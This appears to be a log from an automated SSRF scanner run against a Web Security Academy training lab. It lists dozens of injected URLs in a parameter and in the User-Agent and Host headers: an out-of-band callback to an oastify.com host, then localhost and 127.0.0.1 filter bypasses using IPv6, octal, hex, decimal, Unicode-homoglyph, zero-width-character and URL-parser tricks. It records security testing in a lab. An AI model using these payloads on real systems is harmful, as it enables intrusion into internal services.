[2025-03-26T07:24:09.749247] method=POST param='stockApi' → https://	bcrozxku48s9zpbn1hp75dqft6zxnobd.oastify.com/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:37.238393] method=POST param='header: user-agent' → http://[0000:0000:0000:0000:0000:0000:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:37.610046] method=POST param='header: user-agent' → http://[0000:0000:0000:0000:0000:0000:0000:0001]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:37.970730] method=POST param='header: user-agent' → http://@0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:38.339458] method=POST param='header: user-agent' → http://\l\o\c\a\l\h\o\s\t/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:38.706511] method=POST param='header: user-agent' → http://stock.weliketoshop.net.local/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:39.015662] method=POST param='header: user-agent' → http://stock.weliketoshop.net.localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:39.379784] method=POST param='header: user-agent' → http://0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:39.696318] method=POST param='header: user-agent' → http://0:80/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:40.047398] method=POST param='header: user-agent' → http://0.0.0.0/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:40.388936] method=POST param='header: user-agent' → http://0000.0000.0000.0000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:40.740530] method=POST param='header: user-agent' → http://00000177.00000000.00000000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:41.108030] method=POST param='header: user-agent' → http://0177.0000.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:41.494540] method=POST param='header: user-agent' → http://017700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:41.881596] method=POST param='header: user-agent' → http://0⑰700000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:42.254455] method=POST param='header: user-agent' → http://0x00000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:42.638779] method=POST param='header: user-agent' → http://0x100000000/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:43.006265] method=POST param='header: user-agent' → http://0x17f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:43.356387] method=POST param='header: user-agent' → http://0x17f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:43.695369] method=POST param='header: user-agent' → http://0x7F.0.0000.00000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:44.010488] method=POST param='header: user-agent' → http://0x7F.0.0000.0001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:44.377263] method=POST param='header: user-agent' → http://0x7f.0x00.0x00.0x01/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:44.721547] method=POST param='header: user-agent' → http://0x7f.0x00.0x00.0x02/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:45.019448] method=POST param='header: user-agent' → http://0x7F.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:45.362241] method=POST param='header: user-agent' → http://0x7f000001/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:45.710406] method=POST param='header: user-agent' → http://0x7f000002/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:46.080465] method=POST param='header: user-agent' → http://127.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:46.436881] method=POST param='header: user-agent' → http://1㉗.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:46.787350] method=POST param='header: user-agent' → http://⑫7.0.0.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:47.098165] method=POST param='header: user-agent' → http://127.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:47.433724] method=POST param='header: user-agent' → http://1㉗.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:47.782876] method=POST param='header: user-agent' → http://⑫7.0.0.2/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:48.134347] method=POST param='header: user-agent' → http://127.000000000000000.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:48.506054] method=POST param='header: user-agent' → http://127.1/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:48.853543] method=POST param='header: user-agent' → http://2130706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:49.211004] method=POST param='header: user-agent' → http://21307064㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:49.543413] method=POST param='header: user-agent' → http://2130706㊸3/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:49.923006] method=POST param='header: user-agent' → http://21㉚706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:50.264553] method=POST param='header: user-agent' → http://2⑬0706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:50.626254] method=POST param='header: user-agent' → http://㉑30706433/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:50.969890] method=POST param='header: user-agent' → http://㉑㉚⑦⓪⑥④㉝/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:51.372745] method=POST param='header: user-agent' → http://45080379393/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:51.724509] method=POST param='header: user-agent' → http://localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:52.049888] method=POST param='header: user-agent' → http://­localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:52.414179] method=POST param='header: user-agent' → http://͏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:52.777016] method=POST param='header: user-agent' → http://᠋localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:53.145819] method=POST param='header: user-agent' → http://᠌localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:53.508293] method=POST param='header: user-agent' → http://᠍localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:53.869382] method=POST param='header: user-agent' → http://᠎localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:54.235763] method=POST param='header: user-agent' → http://᠏localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:54.584506] method=POST param='header: user-agent' → http://​localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:54.900347] method=POST param='header: user-agent' → http://⁠localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:55.240240] method=POST param='header: user-agent' → http://⁤localhost/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:55.588690] method=POST param='header: user-agent' → http://localhoﬆ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:55.961127] method=POST param='header: user-agent' → http://lo㎈host/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:56.328289] method=POST param='header: user-agent' → http://localhoﬅ/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:56.640441] method=POST param='header: user-agent' → https://localhost#@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:57.043796] method=POST param='header: user-agent' → https://localhost%23@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:57.376693] method=POST param='header: user-agent' → http://localhost#@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:57.820382] method=POST param='header: user-agent' → http://localhost%23@stock.weliketoshop.net || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:58.197879] method=POST param='header: host' → https://[::]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:58.566399] method=POST param='header: host' → https://[::1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:58.925026] method=POST param='header: host' → https://[::ffff:0.0.0.0]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:59.278561] method=POST param='header: host' → https://[::ffff:0000:0000]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:59.614310] method=POST param='header: host' → https://[::ffff:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:00:59.962612] method=POST param='header: host' → https://[::ﬀﬀ:7f00:1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:01:00.328704] method=POST param='header: host' → https://[0:0:0:0:0:ffff:127.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:01:00.631747] method=POST param='header: host' → https://[0:0:0:0:0:ffff:1㉗.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
[2025-03-26T08:01:00.998664] method=POST param='header: host' → https://[0:0:0:0:0:ffff:⑫7.0.0.1]/ || FILENAME: requests_responses\0a570010036e37828575547e00a60092.web-security-academy.net\request_7.json 
